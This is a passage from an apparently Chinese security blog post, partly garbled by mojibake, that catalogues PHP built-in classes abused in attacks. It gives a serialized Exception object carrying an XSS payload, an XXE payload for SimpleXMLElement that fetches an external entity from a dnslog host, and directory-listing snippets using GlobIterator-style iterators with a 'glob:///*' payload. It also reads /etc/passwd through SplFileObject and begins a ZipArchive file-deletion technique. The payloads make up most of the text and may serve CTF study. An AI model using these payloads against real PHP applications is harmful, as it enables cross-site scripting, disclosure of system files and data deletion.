class="language-none">O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A52%3A%22D%3A%5CDesktopFolder%5CCode%5CPhpCode%5CPhpStorm%5Ctest%5Ctest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20210521215327661.png" alt loading="lazy"></p><h3 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h3><p>XXE</p><p><strong>range</strong>ï¼š<code>(PHP 5, PHP 7, PHP 8)</code></p><p>åˆ©ç”¨å®ä¾‹åŒ–è¯¥ç±»çš„å¯¹è±¡æ¥ä¼ å…¥xmlä»£ç è¿›è¡Œxxeæ”»å‡»ï¼Œè¿›è€Œè¯»å–æ–‡ä»¶å†…å®¹å’Œå‘½ä»¤æ‰§è¡Œã€‚</p><p><strong>payload</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span><span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string double-quoted-string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string double-quoted-string">"utf-8"</span> <span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span> <span class="token punctuation">[</span><span class="token internal-subset">    &lt;!ENTITY % remote SYSTEM "http://suhk4i.dnslog.cn">%remote;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span>&amp;xee<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span>EOF;$xml_class = new SimpleXMLElement($xml, LIBXML_NOENT);var_dump($xml_class);?></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20210521220408864.png" alt loading="lazy"></p><h3 id="SPL-File-Class"><a href="#SPL-File-Class" class="headerlink" title="SPL File Class"></a>SPL File Class</h3><h4 id="å¯éå†ç›®å½•ç±»"><a href="#å¯éå†ç›®å½•ç±»" class="headerlink" title="å¯éå†ç›®å½•ç±»"></a>å¯éå†ç›®å½•ç±»</h4><p><strong>DirectoryIterator</strong></p><p><strong>range</strong>ï¼š<code>(PHP 5, PHP 7, PHP 8)</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ä¸åŠ __toString()ä¹Ÿå¯,å› ä¸ºechoå¯ä»¥è‡ªåŠ¨è°ƒç”¨</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20210521224348452.png" alt loading="lazy"></p><p><strong>FilesystemIterator</strong></p><p><strong>range</strong>ï¼š<code>(PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilesystemIterator</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">#payload : cmd=glob:///*</span></span></code></pre><p><strong>GlobIterator</strong></p><p><strong>range</strong>ï¼š<code>(PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GlobIterator</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">#payload : cmd=glob:///*</span></span></code></pre><h4 id="å¯è¯»å–æ–‡ä»¶ç±»"><a href="#å¯è¯»å–æ–‡ä»¶ç±»" class="headerlink" title="å¯è¯»å–æ–‡ä»¶ç±»"></a>å¯è¯»å–æ–‡ä»¶ç±»</h4><p><strong>SplFileObject</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$context</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SplFileObject</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$context</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20210521225031747.png" alt loading="lazy"></p><h3 id="ZipArchive-open"><a href="#ZipArchive-open" class="headerlink" title="ZipArchive::open()"></a>ZipArchive::open()</h3><p>å¯è¿›è¡Œæ–‡ä»¶åˆ é™¤æ“ä½œ</p><p><strong>range</strong>ï¼š<code>PHP 5 &gt;= 5.2.0, PHP 7, PHP 8, PECL zip &gt;= 1.1.0</code></p><pre class="language-php" data-language="php"><code class="language-php">ZipArchive <span class="token punctuation">&#123;</span>    <span class="token comment">/* æ–¹æ³• */</span>    <span class="token keyword">public</span> <span class="token function">addEmptyDir</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$dirname</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">addFile</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$filepath</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$entryname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token class-name static-context">ZipArchive</span><span class="token operator">::</span><span class="token constant">FL_OVERWRITE</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">addFromString</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$content</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token class-name static-context">ZipArchive</span><span class="token operator">::</span><span class="token constant">FL_OVERWRITE</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">addGlob</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$pattern</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">addPattern</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$pattern</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"."</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">close</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">count</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">int</span>    <span class="token keyword">public</span> <span class="token function">deleteIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">deleteName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token function">extractTo</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$destination</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">mixed</span> <span class="token variable">$entries</span> <span class="token operator">=</span> <span class="token operator">?</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">getArchiveComment</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">getCommentIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">getCommentName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">GetExternalAttributesIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$opsys</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$attr</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token operator">?</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">getExternalAttributesName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$opsys</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$attr</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">getFromIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">getFromName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">getNameIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">getStatusString</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span>    <span class="token keyword">public</span> <span class="token function">getStream</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token class-name">resource</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token function">isCompressionMethodSupported</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$method</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">bool</span> <span class="token variable">$enc</span> <span class="token operator">=</span> <span class="token constant boolean">true</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token function">isEncryptionMethodSupported</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$method</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">bool</span> <span class="token variable">$enc</span> <span class="token operator">=</span> <span class="token constant boolean">true</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">locateName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">int</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">open</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$filename</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span><span class="token operator">|</span><span class="token keyword type-declaration">int</span>    <span class="token keyword">public</span> <span class="token function">registerCancelCallback</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">callable</span> <span class="token variable">$callback</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">registerProgressCallback</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">float</span> <span class="token variable">$rate</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">callable</span> <span class="token variable">$callback</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">renameIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$new_name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">renameName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$new_name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">replaceFile</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$filepath</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setArchiveComment</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$comment</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setCommentIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$comment</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setCommentName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$comment</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setCompressionIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$method</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$compflags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setCompressionName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$method</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$compflags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setEncryptionIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$method</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setEncryptionName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$method</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setExternalAttributesIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$opsys</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$attr</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setExternalAttributesName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$opsys</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$attr</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setMtimeIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$timestamp</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">setMtimeName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$timestamp</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">setPassword</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$password</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">statIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">statName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">unchangeAll</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">unchangeArchive</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">unchangeIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">unchangeName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span><span class="token punctuation">&#125;</span></code></pre><p><strong>use</strong>ï¼š<code>ZipArchive::open ( string $filename [, int $flags ] ) : mixed</code></p><p><strong>flags</strong>ï¼šThe mode to use to open the archive.</p><ul><li><strong><code>ZipArchive::OVERWRITE</code></strong>ï¼šæ€»æ˜¯ä»¥ä¸€ä¸ªæ–°çš„å‹ç¼©åŒ…å¼€å§‹ï¼Œæ­¤æ¨¡å¼ä¸‹å¦‚æœå·²ç»å­˜åœ¨åˆ™ä¼šè¢«è¦†ç›–ã€‚</li><li><strong><code>ZipArchive::CREATE</code></strong>ï¼šå¦‚æœä¸å­˜åœ¨åˆ™åˆ›å»ºä¸€ä¸ªzipå‹ç¼©åŒ…ã€‚</li><li><strong><code>ZipArchive::RDONLY</code></strong>ï¼šåªè¯»æ¨¡å¼æ‰“å¼€å‹ç¼©åŒ…ã€‚ <code>PHP&gt;7.4.3, PECL zip&gt;1.17.1</code></li><li><strong><code>ZipArchive::EXCL</code></strong>ï¼šå¦‚æœå‹ç¼©åŒ…å·²ç»å­˜åœ¨ï¼Œåˆ™å‡ºé”™ã€‚</li><li><strong><code>ZipArchive::CHECKCONS</code></strong>ï¼šå¯¹å‹ç¼©åŒ…æ‰§è¡Œé¢å¤–çš„ä¸€è‡´æ€§æ£€æŸ¥ï¼Œå¦‚æœå¤±è´¥åˆ™æ˜¾ç¤ºé”™è¯¯ã€‚</li></ul><p><strong>Demo</strong></p><pre class="language-php" data-language="php"><code 